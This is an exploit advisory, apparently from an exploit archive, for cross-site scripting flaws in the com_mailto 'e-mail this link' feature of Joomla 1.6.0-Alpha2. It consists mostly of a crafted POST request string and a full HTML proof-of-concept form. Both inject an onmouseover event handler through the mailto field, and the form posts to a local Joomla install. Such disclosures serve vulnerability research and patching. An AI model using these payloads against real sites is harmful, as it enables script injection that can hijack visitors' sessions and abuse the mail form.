@@ -1,0 +1,102 @@
+# Title:Joomla_1.6.0-Alpha2 XSS Vulnerabilities 
+# Date: 2010-05-02
+# Author: mega-itec.com
+# Software Link:
+http://joomlacode.org/gf/download/frsrelease/11322/45252/Joomla_1.6.0-Alpha2-Full-Package.zip
+# Version: 1.6.0-alpha2
+# Tested on: [relevant os]
+# CVE : 
+# Code : 
+[:::::::::::::::::::::::::::::::::::::: 0x1
+::::::::::::::::::::::::::::::::::::::]
+>> General Information
+Advisory/Exploit Title = Joomla_1.6.0-Alpha2 XSS Vulnerabilities 
+Author = mega-itec security team
+Contact = securite@mega-itec.com 
+ 
+[:::::::::::::::::::::::::::::::::::::: 0x2
+::::::::::::::::::::::::::::::::::::::]
+>> Product information
+Name = Joomla
+Vendor = Joomla
+Vendor Website = http://www.joomla.org/
+Affected Version(s) = 1.6.0-Alpha2
+ 
+  
+[:::::::::::::::::::::::::::::::::::::: 0x3
+::::::::::::::::::::::::::::::::::::::]
+>> #1 Vulnerability
+Type = XSS ( POST ) mailto,subject,from,sender 
+Example URI = 
+option=com_mailto&task=user%2Elogin&32720689cad34365fbe10002f91e50a9=1&mailto=%F6"+onmouseover=prompt(406426661849)//&sender=mega-itec@mega-ite.com&from=mega-itec@mega-ite.com&subject=mega-itec@mega-ite.com&layout=default&tmpl=component&link=encode
+link with base 64
+ 
+>> #2 html code exploit : 
+<form action="http://localhost/Joomla_1.6.0-Alpha2-Full-Package/index.php"
+name="mailtoForm" method="post">
+
+<div style="padding: 10px;">
+	<div style="text-align:right">
+		<a href="javascript: void window.close()">
+			Close Window <img
+src="http://localhost/Joomla_1.6.0-Alpha2-Full-Package/components/com_mailto/assets/close-x.png"
+border="0" alt="" title="" /></a>
+	</div>
+
+	<h2>
+		E-mail this link to a friend.	</h2>
+
+	<p>
+		E-mail to:
+		<br />
+		<input type="text" name="mailto" class="inputbox" size="25" value="&#65533;"
+onmouseover=prompt(406426661849)//"/>
+	</p>
+
+	<p>
+		Sender:
+		<br />
+		<input type="text" name="sender" class="inputbox"
+value="mega-itec@mega-ite.com" size="25" />
+	</p>
+
+	<p>
+		Your E-mail:
+		<br />
+		<input type="text" name="from" class="inputbox"
+value="mega-itec@mega-ite.com" size="25" />
+	</p>
+
+	<p>
+		Subject:
+		<br />
+		<input type="text" name="subject" class="inputbox"
+value="mega-itec@mega-ite.com" size="25" />
+	</p>
+
+	<p>
+		<button class="button" onclick="return submitbutton('send');">
+			Send		</button>
+		<button class="button" onclick="window.close();return false;">
+			Cancel		</button>
+	</p>
+</div>
+
+	<input type="hidden" name="layout" value="default" />
+	<input type="hidden" name="option" value="com_mailto" />
+	<input type="hidden" name="task" value="send" />
+	<input type="hidden" name="tmpl" value="component" />
+	<input type="hidden" name="link" value="encode you link with base64" />
+	<input type="hidden" name="4b42dc29b4b226460d1b510634e21864" value="1"
+/></form>
+ 
+ 
+[:::::::::::::::::::::::::::::::::::::: 0x4
+::::::::::::::::::::::::::::::::::::::]
+>> Misc
+mega-itec.com ::: mega-itec security team 
+ 
+ 
+[:::::::::::::::::::::::::::::::::::::: EOF
+::::::::::::::::::::::::::::::::::::::]
+
